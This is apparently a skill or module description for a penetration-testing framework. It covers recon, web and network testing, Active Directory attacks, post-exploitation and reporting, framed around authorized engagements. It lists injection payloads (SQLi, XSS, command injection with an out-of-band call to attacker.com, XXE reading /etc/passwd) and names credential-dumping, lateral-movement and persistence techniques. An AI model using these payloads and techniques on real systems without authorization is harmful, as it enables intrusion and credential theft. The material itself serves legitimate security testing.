---
name: "penetration-testing"
category: "redteam"
version: "1.0.0"
tags: ["redteam", "penetration-testing", "offensive-security", "vulnerability-assessment"]
---

# Penetration Testing Framework

## Overview

The Penetration Testing module provides a structured, methodology-driven approach to authorized security assessments. It covers the full lifecycle of a professional penetration test — from scope reconnaissance and attack surface mapping through exploitation, post-exploitation, privilege escalation, and reporting. This module is designed for red team operators conducting authorized engagements against defined scopes, with emphasis on documentation, evidence capture, and operational discipline.

Unlike ad-hoc vulnerability scanning, this module enforces a phased approach aligned with industry standards (PTES, OWASP, NIST SP 800-115) while providing practical tooling for each phase. Every action is logged with timestamps, targets, and outcomes to support professional report generation and legal defensibility.

**Authorization is mandatory.** This module includes scope validation gates that must pass before any active testing begins. Never operate without explicit written authorization from the target organization.

## Core Capabilities

### 1. Reconnaissance & OSINT
- Passive information gathering (DNS, WHOIS, certificate transparency, search engines)
- Active service discovery and fingerprinting
- Technology stack identification
- Subdomain enumeration and virtual host discovery
- Social media and public record analysis

### 2. Vulnerability Assessment
- Network service vulnerability scanning
- Web application security testing (OWASP Top 10 coverage)
- Configuration audit against CIS benchmarks
- Credential exposure checking (breach databases, default creds)
- Certificate and TLS configuration analysis

### 3. Exploitation & Initial Access
- Controlled exploitation of discovered vulnerabilities
- Credential-based attacks (password spraying, default creds)
- Web application exploitation (SQLi, XSS, SSRF, auth bypass)
- Client-side attack vectors (where authorized)
- Supply chain and third-party integration testing

### 4. Post-Exploitation & Lateral Movement
- Session management and persistence
- Privilege escalation (local and domain)
- Lateral movement techniques
- Credential harvesting and pivoting
- Data exfiltration simulation

### 5. Reporting & Documentation
- Structured finding documentation with CVSS scoring
- Evidence capture (screenshots, request/response pairs, logs)
- Executive summary generation
- Technical remediation guidance
- Risk prioritization matrix

## Usage Examples

### Initialize a Penetration Test Engagement

```python
from penetration_testing import PenetrationTest, Scope, Engagement

# Define engagement scope
scope = Scope(
    target_domains=["example.com", "*.example.com"],
    excluded_hosts=["10.0.0.1", "db.example.com"],
    ip_ranges=["192.168.1.0/24", "10.0.0.0/8"],
    ports="1-65535",
    rules_of_engagement={
        "testing_window": "2024-01-15 to 2024-02-15",
        "allowed_techniques": ["all"],
        "forbidden_actions": ["destructive", "dos"],
        "emergency_contact": "+1-555-0199",
        "notification_required": True,
    }
)

# Create engagement
engagement = Engagement(
    name="ACME Corp External Penetration Test",
    client="ACME Corporation",
    authorizer="Jane Smith, CISO",
    scope=scope,
    start_date="2024-01-15",
    end_date="2024-02-15",
)

# Initialize the pentest engine
pentest = PenetrationTest(engagement)
pentest.configure(
    aggressiveness="moderate",
    max_concurrent_tasks=10,
    evidence_storage="./evidence/acme_2024",
    log_level="verbose",
)
```

### Execute Reconnaissance Phase

```python
from penetration_testing import ReconPhase, ReconTarget

# Create reconnaissance phase
recon = ReconPhase(pentest)

# Passive reconnaissance
passive_results = recon.passive_recon(
    targets=[
        ReconTarget(domain="example.com", techniques=["dns", "whois", "cert transparency", "search engines"])
    ],
    tools=["subfinder", "amass", "crt.sh", "waybackurls"],
)

print(f"Found {len(passive_results.subdomains)} subdomains")
print(f"Discovered {len(passive_results.services)} services")
print(f"Identified {len(passive_results.technologies)} technologies")

# Active reconnaissance
active_results = recon.active_recon(
    targets=passive_results.live_hosts,
    techniques=["port_scan", "service_detection", "web_crawling"],
    nmap_flags="-sV -sC -O --open",
)

# Generate attack surface map
attack_surface = recon.build_attack_surface(
    passive=passive_results,
    active=active_results,
    output_format="graph",
)
```

### Vulnerability Scanning and Analysis

```python
from penetration_testing import VulnScanPhase, ScanProfile, Vulnerability

# Configure scanning profile
profile = ScanProfile(
    name="Web Application Scan",
    targets=["https://app.example.com"],
    scanners=["nuclei", "nikto", "nmap"],
    severity_threshold="medium",
    scan_speed="thorough",
    custom_wordlists=["/path/to/custom.txt"],
)

# Run vulnerability scan
scan = VulnScanPhase(pentest)
results = scan.run(profile)

# Analyze and triage findings
for vuln in results.vulnerabilities:
    if vuln.severity.value >= Vulnerability.Severity.HIGH:
        print(f"[HIGH] {vuln.title}")
        print(f"  Target: {vuln.target}")
        print(f"  CVSS: {vuln.cvss_score}")
        print(f"  CWE: {vuln.cwe_id}")
        print(f"  Evidence: {vuln.evidence_path}")

# Generate vulnerability report
report = scan.generate_report(
    format="markdown",
    include_remediation=True,
    risk_matrix=True,
)
```

### Exploitation Workflow

```python
from penetration_testing import ExploitPhase, Exploit, ExploitResult

# Create exploitation phase
exploit_phase = ExploitPhase(pentest)

# Validate before exploiting
is_validated = exploit_phase.validate_target(
    target="app.example.com",
    scope_check=True,
    authorization_check=True,
    previous_findings_check=True,
)

if not is_validated:
    raise ScopeViolation("Target not in authorized scope")

# Execute exploitation
results = exploit_phase.exploit(
    findings=results.vulnerabilities,
    strategy="safe",  # safe | moderate | aggressive
    documentation=True,
    evidence_capture=True,
)

# Review results
for result in results:
    if result.success:
        print(f"Exploited: {result.vulnerability.title}")
        print(f"Access level: {result.access_level}")
        print(f"Proof: {result.proof_path}")
        
        # Create session for post-exploitation
        session = exploit_phase.create_session(result)
```

### Post-Exploitation and Lateral Movement

```python
from penetration_testing import PostExploitPhase, Session, CredentialDump

# Resume from exploitation session
post_exploit = PostExploitPhase(pentest, session=session)

# Local privilege escalation
privesc = post_exploit.privesc_enumeration(
    techniques=["suid", "sudo_misconfig", "kernel_exploit", "service_abuse"],
)

if privesc.vectors:
    escalation = post_exploit.execute_privesc(privesc.vectors[0])
    print(f"Escalated to: {escalation.current_user}")

# Credential harvesting
creds = post_exploit.credential_harvest(
    methods=["lsass_dump", "browser_creds", "config_files", "memory"],
    output_path="./credentials/",
)

# Lateral movement
lateral = post_exploit.lateral_movement(
    target_network="10.0.0.0/24",
    methods=["pass_the_hash", "remote_exec", "smb_share"],
    pivot_through=session.compromised_host,
)

# Data exfiltration simulation
exfil = post_exploit.simulate_exfiltration(
    target_data="PII samples",
    method="dns_tunneling",  # dns | https | icmp
    size_limit_mb=50,
    stealth=True,
)
```

## Best Practices

### Authorization and Legal
1. **Always obtain written authorization** before testing. Document scope, contacts, and emergency procedures.
2. **Respect scope boundaries.** Never test systems outside the agreed scope, even if vulnerabilities are discovered.
3. **Follow rules of engagement** strictly. If something is ambiguous, pause and consult the client.
4. **Preserve evidence** of all testing activities for legal defensibility.

### Operational Security
1. **Use dedicated testing infrastructure.** Isolate your attack platform from personal and production systems.
2. **VPN or proxy all traffic** through authorized testing infrastructure.
3. **Rotate infrastructure** between engagements to prevent cross-contamination.
4. **Sanitize all evidence** before storage. Remove real credentials and PII.

### Documentation Discipline
1. **Log everything with timestamps.** Use structured logging that can be parsed for reports.
2. **Capture evidence immediately.** Screenshot, save request/response pairs, and note observations in real-time.
3. **Tag findings with unique IDs** for cross-referencing in reports and remediation tracking.
4. **Maintain a running timeline** of the engagement for executive summaries.

### Technical Methodology
1. **Follow a phased approach.** Don't jump to exploitation before completing reconnaissance.
2. **Validate findings before reporting.** A false positive damages credibility more than a missed finding.
3. **Test for impact, not just vulnerability.** Demonstrate what an attacker could achieve.
4. **Consider business context.** A medium-severity finding in a payment system may outweigh a critical finding elsewhere.

### Reporting
1. **Write for the audience.** Executives need risk summaries; engineers need technical details.
2. **Include clear remediation steps.** Every finding should have actionable guidance.
3. **Prioritize by business risk,** not just CVSS score.
4. **Provide evidence.** Include screenshots, code snippets, and reproduction steps.

## Related Modules

- **exploit-development** — Custom exploit development and shellcode crafting for authorized testing
- **social-engineering** — Authorized phishing, pretexting, and physical security testing
- **red-team-operations** — Full-scope adversary simulation and operational planning
- **adversary-emulation** — Threat actor TTP mapping and APT simulation frameworks
- **web2-vuln-classes** — Comprehensive reference for web vulnerability classes
- **offensive-osint** — Advanced reconnaissance and open-source intelligence gathering
- **report-writing** — Professional security report authoring and CVSS scoring

---

## Advanced Penetration Testing Topics

### Comprehensive Reconnaissance Framework

Reconnaissance is the foundation of every successful penetration test. The more you know about the target, the more effective your attack path will be.

```python
class ReconFramework:
    """Structured reconnaissance framework for penetration testing"""

    def __init__(self, target_domain):
        self.target = target_domain
        self.results = {
            "passive": {},
            "active": {},
            "attack_surface": [],
        }

    def passive_reconnaissance(self):
        """Execute passive reconnaissance (no direct contact with target)"""
        techniques = {
            "dns_enumeration": self._dns_enum,
            "whois_analysis": self._whois_lookup,
            "certificate_transparency": self._cert_transparency,
            "search_engine_dorking": self._google_dorks,
            "social_media_recon": self._social_media,
            "breach_data_check": self._breach_check,
            "github_secret_scan": self._github_recon,
            "technology_fingerprint": self._tech_fingerprint,
            "email_enumeration": self._email_enum,
            "employee_recon": self._employee_recon,
        }

        results = {}
        for name, func in techniques.items():
            print(f"[*] Running: {name}")
            try:
                results[name] = func()
            except Exception as e:
                results[name] = {"error": str(e)}

        return results

    def _dns_enum(self):
        """DNS enumeration for subdomain discovery"""
        import subprocess
        import json

        commands = {
            "subfinder": f"subfinder -d {self.target} -silent -json",
            "amass": f"amass enum -passive -d {self.target} -json",
            "assetfinder": f"assetfinder --subs-only {self.target}",
        }

        subdomains = set()
        for tool, cmd in commands.items():
            try:
                result = subprocess.run(
                    cmd, shell=True, capture_output=True,
                    text=True, timeout=300
                )
                for line in result.stdout.strip().split('\n'):
                    if line:
                        subdomains.add(line.strip())
            except:
                continue

        return {
            "subdomains": list(subdomains),
            "total_found": len(subdomains),
        }

    def _cert_transparency(self):
        """Query certificate transparency logs"""
        import requests

        url = f"https://crt.sh/?q=%.{self.target}&output=json"
        response = requests.get(url, timeout=30)

        entries = response.json()
        subdomains = set()
        for entry in entries:
            name = entry.get("name_value", "")
            for sub in name.split("\n"):
                subdomains.add(sub.strip())

        return {
            "subdomains": list(subdomains),
            "total_entries": len(entries),
            "unique_subdomains": len(subdomains),
        }

    def _google_dorks(self):
        """Google dorking for information disclosure"""
        dorks = [
            f'site:{self.target} filetype:pdf',
            f'site:{self.target} filetype:doc | filetype:docx',
            f'site:{self.target} filetype:xls | filetype:xlsx',
            f'site:{self.target} filetype:sql',
            f'site:{self.target} inurl:admin',
            f'site:{self.target} inurl:login',
            f'site:{self.target} intitle:"index of"',
            f'site:{self.target} "password" | "credentials"',
            f'site:{self.target} ext:log | ext:txt',
            f'site:{self.target} inurl:wp-content | inurl:wp-admin',
        ]
        return {"dorks": dorks, "note": "Manual execution recommended"}

    def _email_enum(self):
        """Email address enumeration"""
        techniques = [
            "theHarvester for email collection",
            "Hunter.io API for email patterns",
            "LinkedIn search for employee emails",
            "GitHub commit history for email leaks",
        ]
        return {
            "techniques": techniques,
            "patterns_to_check": [
                f"first.last@{self.target}",
                f"firstlast@{self.target}",
                f"flast@{self.target}",
                f"first_l@{self.target}",
            ],
        }

    def active_reconnaissance(self, targets):
        """Execute active reconnaissance (direct contact with target)"""
        techniques = {
            "port_scanning": self._port_scan,
            "service_detection": self._service_detect,
            "web_crawling": self._web_crawl,
            "directory_bruteforce": self._dir_bruteforce,
            "technology_detection": self._tech_detect,
            "ssl_tls_analysis": self._ssl_analysis,
            "virtual_host_discovery": self._vhost_enum,
        }

        results = {}
        for name, func in techniques.items():
            print(f"[*] Running: {name}")
            try:
                results[name] = func(targets)
            except Exception as e:
                results[name] = {"error": str(e)}

        return results

    def _port_scan(self, targets):
        """Comprehensive port scanning"""
        import subprocess

        results = {}
        for target in targets:
            cmd = f"nmap -sV -sC -O -p- --open -T4 {target}"
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=600
            )
            results[target] = result.stdout
        return results

    def _ssl_analysis(self, targets):
        """SSL/TLS configuration analysis"""
        import subprocess

        results = {}
        for target in targets:
            cmd = f"testssl.sh --jsonfile {target}_ssl.json {target}"
            try:
                subprocess.run(cmd, shell=True, timeout=300)
            except:
                pass
            results[target] = f"{target}_ssl.json"
        return results

    def build_attack_surface(self):
        """Compile all recon results into attack surface map"""
        attack_surface = {
            "external_ips": [],
            "subdomains": [],
            "web_applications": [],
            "services": [],
            "technologies": [],
            "email_addresses": [],
            "credentials_found": [],
            "potential_vulns": [],
        }
        return attack_surface
```

### Web Application Testing Methodology

```python
class WebAppTesting:
    """Structured web application penetration testing methodology"""

    OWASP_TOP_10_2021 = [
        "A01:2021 - Broken Access Control",
        "A02:2021 - Cryptographic Failures",
        "A03:2021 - Injection",
        "A04:2021 - Insecure Design",
        "A05:2021 - Security Misconfiguration",
        "A06:2021 - Vulnerable and Outdated Components",
        "A07:2021 - Identification and Authentication Failures",
        "A08:2021 - Software and Data Integrity Failures",
        "A09:2021 - Security Logging and Monitoring Failures",
        "A10:2021 - Server-Side Request Forgery (SSRF)",
    ]

    def test_authentication(self, target_url):
        """Test authentication mechanisms"""
        tests = {
            "default_credentials": self._test_default_creds,
            "brute_force_protection": self._test_rate_limiting,
            "password_policy": self._test_password_policy,
            "session_management": self._test_session_mgmt,
            "mfa_bypass": self._test_mfa_bypass,
            "password_reset": self._test_password_reset,
            "oauth_implementation": self._test_oauth,
            "jwt_security": self._test_jwt,
        }
        results = {}
        for name, func in tests.items():
            results[name] = func(target_url)
        return results

    def _test_default_creds(self, target_url):
        """Test for default credentials"""
        default_creds = [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("root", "root"),
            ("root", "toor"),
            ("test", "test"),
            ("guest", "guest"),
        ]
        return {"default_creds": default_creds, "tested": True}

    def _test_session_mgmt(self, target_url):
        """Test session management"""
        checks = {
            "session_token_entropy": "High entropy random token",
            "session_timeout": "Check for session expiration",
            "session_fixation": "Test if session ID changes after auth",
            "cookie_flags": "HttpOnly, Secure, SameSite attributes",
            "concurrent_sessions": "Multiple session handling",
        }
        return checks

    def _test_jwt(self, target_url):
        """Test JWT implementation security"""
        attacks = [
            "alg=none attack",
            "Weak HMAC secret bruteforce",
            "Key confusion (RSA to HMAC)",
            "JWT token replay",
            "JWT claim manipulation",
            "kid parameter injection",
            "jwk/jku header injection",
        ]
        return {"jwt_attacks": attacks}

    def test_authorization(self, target_url):
        """Test authorization and access control"""
        tests = {
            "idor": "Insecure Direct Object Reference testing",
            "privilege_escalation": "Vertical and horizontal privilege escalation",
            "function_level_access": "Access to functions without proper role",
            "data_level_access": "Access to data beyond authorized scope",
            "api_authorization": "API endpoint authorization testing",
        }
        return tests

    def test_injection(self, target_url):
        """Test for injection vulnerabilities"""
        injection_types = {
            "sqli": {
                "union": "' UNION SELECT NULL,NULL,NULL--",
                "blind": "' AND 1=1--",
                "time_based": "' AND SLEEP(5)--",
                "error_based": "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
                "stacked": "'; SELECT * FROM users--",
            },
            "xss": {
                "reflected": "<script>alert(1)</script>",
                "stored": "<img src=x onerror=alert(1)>",
                "dom_based": "javascript:alert(1)",
                "mutation": "<img src=x onerror=alert(1)//",
            },
            "command_injection": {
                "basic": "; whoami",
                "blind": "; sleep 5",
                "time_based": "| ping -c 5 127.0.0.1",
                "out_of_band": "; nslookup attacker.com",
            },
            "xxe": {
                "basic": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
                "parameter_entity": "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://attacker.com/xxe'>%xxe;]>",
            },
            "ssti": {
                "jinja2": "{{7*7}}",
                "freemarker": "${7*7}",
                "twig": "{{7*7}}",
                "handlebars": "{{7*7}}",
            },
        }
        return injection_types

    def test_business_logic(self, target_url):
        """Test business logic vulnerabilities"""
        tests = {
            "price_manipulation": "Modify price in request parameters",
            "quantity_manipulation": "Negative quantity or overflow",
            "race_conditions": "Concurrent request exploitation",
            "workflow_bypass": "Skip steps in multi-step process",
            "coupon_abuse": "Reuse or chain discount codes",
            "payment_bypass": "Skip payment verification steps",
            "cart_manipulation": "Modify cart after checkout",
        }
        return tests

    def test_api_security(self, target_url):
        """Test API-specific vulnerabilities"""
        tests = {
            "mass_assignment": "Send extra fields in API requests",
            "broken_authentication": "API authentication bypass",
            "excessive_data_exposure": "Check if API returns more data than needed",
            "rate_limiting": "Test API rate limiting",
            "graphql_introspection": "Enable GraphQL schema discovery",
            "api_versioning": "Test older API versions for vulnerabilities",
            "cors_misconfiguration": "Test CORS origin validation",
        }
        return tests
```

### Network Service Exploitation

```python
class NetworkServiceExploitation:
    """Network service penetration testing methodology"""

    def test_smb(self, target_ip):
        """SMB service testing"""
        tests = {
            "null_session": "Anonymous access to SMB shares",
            "smb_signing": "Check if SMB signing is required",
            "smbv1": "Test for SMBv1 vulnerability (EternalBlue)",
            "share_enumeration": "List accessible shares",
            "user_enumeration": "Enumerate valid users via SID",
            "relay_attack": "NTLM relay attack potential",
            "password_spray": "Password spraying via SMB",
        }
        return tests

    def test_rdp(self, target_ip):
        """RDP service testing"""
        tests = {
            "nla_bypass": "Network Level Authentication bypass",
            "bluekeep": "CVE-2019-0708 vulnerability check",
            "credential_protection": "CredSSP/NLA enforcement",
            "session_hijacking": "Active RDP session takeover",
            "brute_force": "RDP brute force (with proper authorization)",
        }
        return tests

    def test_ssh(self, target_ip):
        """SSH service testing"""
        tests = {
            "weak_ciphers": "Check for weak cipher suites",
            "key_exchange": "Test for weak key exchange algorithms",
            "auth_methods": "Enumerate supported authentication methods",
            "banner_grab": "SSH version disclosure",
            "user_enum": "Valid username enumeration via timing",
        }
        return tests

    def test_ftp(self, target_ip):
        """FTP service testing"""
        tests = {
            "anonymous_access": "Anonymous FTP login",
            "bounce_attack": "FTP bounce attack for port scanning",
            "clear_text": "FTP credentials in clear text",
            "default_creds": "Default FTP credentials",
            "write_access": "Upload capability to web root",
        }
        return tests

    def test_dns(self, target_ip):
        """DNS service testing"""
        tests = {
            "zone_transfer": "AXFR zone transfer test",
            "subdomain_enum": "DNS bruteforce enumeration",
            "cache_poisoning": "DNS cache poisoning potential",
            "dns_rebinding": "DNS rebinding attack potential",
            "open_recursion": "Open DNS resolver abuse",
        }
        return tests
```

### Active Directory Testing

```python
class ADTesting:
    """Active Directory penetration testing methodology"""

    def enumerate_domain(self, domain_controller):
        """Comprehensive AD enumeration"""
        enumeration = {
            "domain_info": self._get_domain_info,
            "user_enum": self._enumerate_users,
            "group_enum": self._enumerate_groups,
            "computer_enum": self._enumerate_computers,
            "gpo_enum": self._enumerate_gpos,
            "trust_enum": self._enumerate_trusts,
            "spn_enum": self._enumerate_spns,
            "acl_enum": self._enumerate_acls,
        }
        results = {}
        for name, func in enumeration.items():
            results[name] = func(domain_controller)
        return results

    def _enumerate_users(self, dc):
        """Enumerate domain users"""
        import subprocess
        cmd = f"ldapsearch -x -H ldap://{dc} -b 'DC=example,DC=com' '(&(objectClass=user))' sAMAccountName description memberOf"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout

    def _enumerate_spns(self, dc):
        """Enumerate Service Principal Names for Kerberoasting"""
        import subprocess
        cmd = f"ldapsearch -x -H ldap://{dc} -b 'DC=example,DC=com' '(&(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout

    def test_kerberos_attacks(self):
        """Test Kerberos-related vulnerabilities"""
        attacks = {
            "kerberoasting": {
                "description": "Request TGS tickets for service accounts and crack offline",
                "tool": "GetUserSPNs.py or Rubeus",
                "impact": "Credential theft for service accounts",
            },
            "as_reproasting": {
                "description": "Request AS-REP for accounts with preauth disabled",
                "tool": "GetNPUsers.py or Rubeus",
                "impact": "Credential theft for accounts without preauth",
            },
            "golden_ticket": {
                "description": "Forge TGT using KRBTGT hash",
                "tool": "Mimikatz or ticketer.py",
                "impact": "Persistent domain access",
            },
            "silver_ticket": {
                "description": "Forge TGS for specific service using service hash",
                "tool": "Mimikatz or ticketer.py",
                "impact": "Access to specific services",
            },
            "delegation_abuse": {
                "description": "Exploit unconstrained/constrained delegation",
                "tool": "Rubeus or getST.py",
                "impact": "Privilege escalation or lateral movement",
            },
        }
        return attacks

    def test_lateral_movement(self):
        """Test lateral movement techniques"""
        techniques = {
            "pass_the_hash": {
                "tool": "psexec.py or CrackMapExec",
                "detection": "Event ID 4624 (Type 3)",
            },
            "pass_the_ticket": {
                "tool": "Rubeus or ptt.py",
                "detection": "Event ID 4768, 4769",
            },
            "overpass_the_hash": {
                "tool": "Rubeus or oth.py",
                "detection": "Event ID 4768 with Kerberos encryption type 0x17",
            },
            "wmi_execution": {
                "tool": "wmiexec.py",
                "detection": "Event ID 4688 with WMI provider host",
            },
            "dcom_execution": {
                "tool": "dcomexec.py",
                "detection": "Event ID 4688 with DCOM object creation",
            },
            "psremoting": {
                "tool": "Invoke-Command or Enter-PSSession",
                "detection": "Event ID 4103, 4104 (PowerShell logging)",
            },
        }
        return techniques

    def test_privilege_escalation(self):
        """Test privilege escalation techniques"""
        techniques = {
            "unquoted_service_path": "Find and exploit unquoted service paths",
            "weak_service_permissions": "Modify service binary path",
            "dll_hijacking": "Plant malicious DLL in service search path",
            "token_impersonation": "Impersonate tokens of privileged users",
            "gpo_abuse": "Modify GPO for domain-wide privilege escalation",
            "acl_abuse": "Abuse misconfigured ACLs on AD objects",
            "kerberos_delegation": "Abuse delegation settings for privilege escalation",
        }
        return techniques
```

### Exploitation Workflow and Session Management

```python
class ExploitWorkflow:
    """Manage exploitation workflow and sessions"""

    def __init__(self, pentest_engine):
        self.engine = pentest_engine
        self.sessions = []
        self.findings = []

    def initial_access(self, vectors):
        """Execute initial access vectors"""
        results = []
        for vector in vectors:
            print(f"[*] Attempting: {vector['name']}")
            result = self._execute_vector(vector)
            if result.success:
                session = self._create_session(result)
                self.sessions.append(session)
                results.append(result)
                print(f"[+] Gained access: {result.access_level}")
            else:
                print(f"[-] Failed: {result.error}")
        return results

    def post_exploitation(self, session):
        """Execute post-exploitation activities"""
        activities = {
            "system_enumeration": self._enumerate_system,
            "credential_harvesting": self._harvest_credentials,
            "privilege_escalation": self._escalate_privileges,
            "lateral_movement": self._move_laterally,
            "persistence": self._establish_persistence,
            "data_staging": self._stage_data,
            "exfiltration_simulation": self._simulate_exfil,
        }

        results = {}
        for name, func in activities.items():
            print(f"[*] Post-exploitation: {name}")
            try:
                results[name] = func(session)
            except Exception as e:
                results[name] = {"error": str(e)}
        return results

    def _enumerate_system(self, session):
        """Enumerate the compromised system"""
        enum_commands = {
            "system_info": "systeminfo",
            "network_config": "ipconfig /all",
            "arp_table": "arp -a",
            "running_processes": "tasklist /v",
            "installed_software": 'reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s',
            "firewall_rules": "netsh advfirewall firewall show rule name=all",
            "scheduled_tasks": "schtasks /query /fo LIST /v",
            "user_accounts": "net user",
            "group_memberships": "net localgroup administrators",
        }
        return enum_commands

    def _harvest_credentials(self, session):
        """Harvest credentials from compromised system"""
        methods = {
            "lsass_dump": "Mimikatz or lsass.minidump",
            "browser_creds": "LaZagne or BrowserGatherer",
            "wifi_passwords": "netsh wlan show profiles",
            "credential_files": "Search for files containing passwords",
            "registry_creds": "Registry hives (SAM, SYSTEM, SECURITY)",
            "memory_artifacts": "Process memory scanning",
        }
        return methods

    def _establish_persistence(self, session):
        """Establish persistence on compromised system"""
        mechanisms = {
            "scheduled_task": "Create scheduled task for re-execution",
            "registry_run_key": "Add to Run/RunOnce registry keys",
            "service_install": "Install new service",
            "dll_side_loading": "DLL hijacking in known application path",
            "startup_folder": "Place payload in startup folder",
            "wmi_event": "WMI event subscription for execution",
            "com_object": "COM object hijacking",
        }
        return mechanisms
```

### Reporting and Evidence Management

```python
class PentestReport:
    """Penetration testing report generation"""

    def __init__(self, engagement):
        self.engagement = engagement
        self.findings = []
        self.evidence = {}

    def add_finding(self, finding):
        """Add a finding with full documentation"""
        validated_finding = self._validate_finding(finding)
        self.findings.append(validated_finding)

    def _validate_finding(self, finding):
        """Validate finding before adding to report"""
        required_fields = [
            "title", "severity", "cvss_score", "description",
            "impact", "remediation", "evidence", "references",
        ]
        for field in required_fields:
            if field not in finding:
                raise ValueError(f"Finding missing required field: {field}")
        return finding

    def generate_executive_summary(self):
        """Generate executive summary"""
        severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        for finding in self.findings:
            severity_counts[finding["severity"]] += 1

        return {
            "engagement_name": self.engagement.name,
            "date_range": f"{self.engagement.start_date} to {self.engagement.end_date}",
            "total_findings": len(self.findings),
            "severity_breakdown": severity_counts,
            "risk_rating": self._calculate_risk_rating(severity_counts),
            "key_findings": self._get_top_findings(5),
            "recommendations": self._get_top_recommendations(3),
        }

    def _calculate_risk_rating(self, counts):
        """Calculate overall risk rating"""
        if counts["critical"] > 0:
            return "CRITICAL"
        elif counts["high"] > 0:
            return "HIGH"
        elif counts["medium"] > 0:
            return "MEDIUM"
        else:
            return "LOW"

    def generate_technical_report(self):
        """Generate detailed technical report"""
        report = {
            "sections": [
                "1. Executive Summary",
                "2. Scope and Methodology",
                "3. Findings Summary",
                "4. Detailed Findings",
                "5. Attack Narratives",
                "6. Remediation Roadmap",
                "7. Appendices",
            ],
            "findings": self.findings,
            "mitre_mapping": self._map_to_mitre(),
            "evidence_index": self.evidence,
        }
        return report

    def _map_to_mitre(self):
        """Map findings to MITRE ATT&CK framework"""
        mapping = {}
        for finding in self.findings:
            if "mitre_techniques" in finding:
                for technique in finding["mitre_techniques"]:
                    if technique not in mapping:
                        mapping[technique] = []
                    mapping[technique].append(finding["title"])
        return mapping
```

### Continuous Testing and Automation

```python
class PentestAutomation:
    """Automate common penetration testing tasks"""

    def automated_vulnerability_scan(self, targets):
        """Run automated vulnerability scan across targets"""
        scanners = {
            "nuclei": "Template-based vulnerability scanner",
            "nikto": "Web server scanner",
            "nmap_scripts": "Nmap NSE vulnerability scripts",
            "wapiti": "Web application vulnerability scanner",
            "testssl": "SSL/TLS configuration scanner",
        }

        results = {}
        for scanner_name, description in scanners.items():
            print(f"[*] Running: {scanner_name}")
            results[scanner_name] = self._run_scanner(scanner_name, targets)
        return results

    def _run_scanner(self, scanner_name, targets):
        """Run a specific scanner against targets"""
        commands = {
            "nuclei": f"nuclei -l {targets} -severity critical,high -json",
            "nikto": f"nikto -h {targets} -o nikto_results.json -Format json",
            "nmap_scripts": f"nmap --script vuln -oX nmap_results.xml {targets}",
            "wapiti": f"wapiti -u {targets} -o wapiti_report.json -f json",
            "testssl": f"testssl --jsonfile ssl_results.json {targets}",
        }
        return commands.get(scanner_name, "Scanner not configured")

    def generate_pentest_checklist(self):
        """Generate a comprehensive pentest checklist"""
        checklist = {
            "pre_engagement": [
                "Written authorization obtained",
                "Scope defined and agreed upon",
                "Rules of engagement documented",
                "Emergency contacts established",
                "Testing infrastructure prepared",
                "Legal review completed",
            ],
            "reconnaissance": [
                "Passive reconnaissance completed",
                "Subdomain enumeration performed",
                "Technology stack identified",
                "Email addresses enumerated",
                "Public information gathered",
                "Attack surface mapped",
            ],
            "vulnerability_assessment": [
                "Port scan completed",
                "Service versions identified",
                "Web application scanned",
                "SSL/TLS tested",
                "Configuration reviewed",
                "Default credentials checked",
            ],
            "exploitation": [
                "Exploitation attempts documented",
                "Successful exploits recorded",
                "Evidence captured",
                "Access levels verified",
                "Session management implemented",
                "Cleanup performed",
            ],
            "post_exploitation": [
                "Privilege escalation attempted",
                "Lateral movement documented",
                "Credential harvesting performed",
                "Data access simulated",
                "Persistence tested",
                "Exfiltration simulated",
            ],
            "reporting": [
                "Executive summary written",
                "Technical findings documented",
                "Evidence organized",
                "Remediation steps provided",
                "CVSS scores assigned",
                "Report reviewed and approved",
            ],
        }
        return checklist
```

### Testing Tools Reference

```python
PENTEST_TOOLS = {
    "reconnaissance": {
        "subfinder": "Fast passive subdomain enumeration tool",
        "amass": "In-depth attack surface mapping and asset discovery",
        "httpx": "Fast HTTP probing toolkit",
        "katana": "Next-gen crawling and spidering framework",
        "theHarvester": "Email, subdomain, and name harvester",
        "recon-ng": "Full-featured reconnaissance framework",
        "Maltego": "Graphical link analysis and data mining",
    },
    "scanning": {
        "nmap": "Network discovery and security auditing",
        "nuclei": "Template-based vulnerability scanner",
        "nikto": "Web server vulnerability scanner",
        "wapiti": "Web application vulnerability scanner",
        "masscan": "Fast port scanner",
        "rustscan": "Modern port scanner written in Rust",
    },
    "exploitation": {
        "metasploit": "Penetration testing framework",
        "sqlmap": "Automatic SQL injection tool",
        "burpsuite": "Web application security testing platform",
        "cobalt_strike": "Adversary simulation and red team operations",
        "sliver": "Open-source cross-platform adversary emulation",
        "havoc": "Modern post-exploitation framework",
    },
    "post_exploitation": {
        "mimikatz": "Windows credential extraction",
        "bloodhound": "Active Directory attack path analysis",
        "crackmapexec": "Post-exploitation assessment tool",
        "evil-winrm": "Windows Remote Management shell",
        "rubeus": "Kerberos abuse toolkit",
        "impacket": "Network protocol toolkit for exploitation",
    },
    "reporting": {
        "ghostwriter": "Penetration testing reporting platform",
        "dradis": "Collaboration and reporting tool",
        "faraday": "Integrated pentest environment",
        "pwndoc": "Penetration testing report generator",
    },
}
```
